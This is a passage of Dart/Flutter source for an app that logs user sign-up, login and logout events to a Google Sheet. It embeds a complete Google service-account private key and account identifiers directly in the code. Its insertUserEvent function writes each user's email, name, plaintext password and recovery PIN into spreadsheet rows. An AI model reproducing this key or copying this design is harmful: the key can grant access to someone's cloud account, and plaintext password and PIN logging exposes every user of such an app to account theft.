  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDXYb4YqW5KDTHX\nk/zkLKwYcBp3ZkKS3S7pOps/+1dJ/Pas2ruq+XtRAKdwkbdeoEFFB8otfX77M9Ga\n3WIhN40XUzlfD4zntPSoh/6F4EUbtOhXvxOsVnvaDw755qZta48rzsDKmtgVplRU\n0IA2JsDePv+LVhj24tKMEBRAMVnsZu5PZa2V/EG6uiC0ldyZmCyapTsIYWXszB5x\n/QVY1MIfU8sAxsQTO5LaI09TMNU6BZf3e1GhdgyVGFr/xaI3w4RwNDMs8dZqkkwJ\nizkq5lbz9HlI93TcF5zMSO0EC65SNu1tfAekrDksOnM5bnE/LujsmnednpWUGtRZ\nSQM7xjqZAgMBAAECggEAJP6OKQzDG5eQGdP6slOE/M6WkS8gnLq+kcNmArOgbt4z\nHYYViXzAJG3tFK4GtctnYpy/qpgdbTbdmBDSB9wTkS/TkSMp4+umQWNYgbS/kg59\nAQNaNPYG4HHJM/3c1LsOlKr23OYDWxaechH9D7AQ3Surd4qij5durC2f2NXROQQ1\nMgdx1zDg9lRVsdXeyjm7w13ziW7PdxveNy9bsp5yDFnaDle8XaPUBYJtGnQL9spn\n06ZSZ15yo2FmGbP625M+PncotCILvtYbBJy4Aq3Xl2UUk2sUhPgW0nZP7mOG9OMI\nGdE9xXa8G7PUWiOukDot52NBj/yTa5R/zGXftYA/HQKBgQD6bYEGIcfyD4OAnAJy\nSMIdSacSmp99v0A3ZR0ta5BUccHPgozEBT9uFS/rY7Xow8R3HxbY451GoJ2K6kS7\nP84IVlpPwViMlrilrUjYVpzXgFD7jJAXuQ6CIbcKiBmNHiDmi6sONEtsyjrl9XOz\n9SGRP9GZtycUXXFIIh/rCA2KjQKBgQDcLJvJS+aTbHBfSf+LZy9spw90kMt6WQKU\nWpN9e5aun0YGypfLYx7cdZ3lMR2Xvw9WgOmOW+9SWyibYJb9KddMivujokx8bN9d\n98qgv2nTNGxweMV+dskucHBAeM7yH7zsorvct4sIvcNl8guWKH8g7wLZMtNIJojQ\nQYP660LTPQKBgQDi1fuv9TtqfDjubuIcaOFDrCpkxKBBQ9JEGxfhw3PZua0HbMZa\n7DH3YcOlIQ1uSJ2WFRgZ35rfla7+XJNjVTkn/igR5B10QzYABEVeiJ3K6hTwtfLz\nOhH1N9rX9E3IsIi2q76GwEGtykStdbaXRCxip/8QkIEahkWNRDPLLeEuJQKBgCwO\nmRXMpFT3q/zFV+dTPIAnZcZTewP+b6+z+DNx2ZMTt/V/8KP4L6K5vmCwVVWaG72Z\niiK8bsUyDIwa5du+1aAxZ200+s0jFAc/oEJOSyTCJrjS0eIebt9mDHA6PF7izvEj\nFyhxadbT8heiOYNQky/J4+4GZ5TWcSYLFhfNn8+ZAoGBANiWidykKQ6rjcOqterU\n+y+SOJi4iUFB4E6GPaZlozqnpRZPq9ACdYCi0lGM1S3Pax9vDg+aRnamhDLKXfan\nTy/VzRfaA/Fua2caShIQAKhlfg/NqukYoF4tVoJZr/WX0R1YHEwbSNhWXs4XnjHp\nhs37IKk5FPmr4ZqNUgfTM7lZ\n-----END PRIVATE KEY-----\n",
  "client_email": "flutter-gsheets-tutorial@level-elevator-458206-n9.iam.gserviceaccount.com",
  "client_id": "104501636623602470049",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/flutter-gsheets-tutorial%40level-elevator-458206-n9.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
''';
  static const _spreadsheetId = '1aAKneeMmANfmH511tOfRkWJ9H51pR23pDmlOVFudnGU';
  static const _worksheetTitle = 'Work2';

  static final _gsheets = GSheets(_credentials);
  static Worksheet? _worksheet;

  static Future<void> init() async {
    final ss = await _gsheets.spreadsheet(_spreadsheetId);
    _worksheet = ss.worksheetByTitle(_worksheetTitle);
  }

  static Future<void> insertUserEvent({
    required String email,
    required String name,
    required String action, // 'signup' / 'login' / 'logout'
    String? password, // Added password parameter (optional)
    String? recoveryPin, // Added recoveryPin parameter (optional)
  }) async {
    if (_worksheet == null) await init();
    final now = DateTime.now();
    final formattedDate =
        "${now.year}-${now.month}-${now.day} ${now.hour}:${now.minute}";
    await _worksheet!.values.map.appendRow({
      'Email': email,
      'Name': name,
      'Action': action,
      'Timestamp': formattedDate,
      'Password': password ?? '', // Add password to sheet
      'RecoveryPin': recoveryPin ?? '', // Add recovery PIN to sheet
    });
  }
}
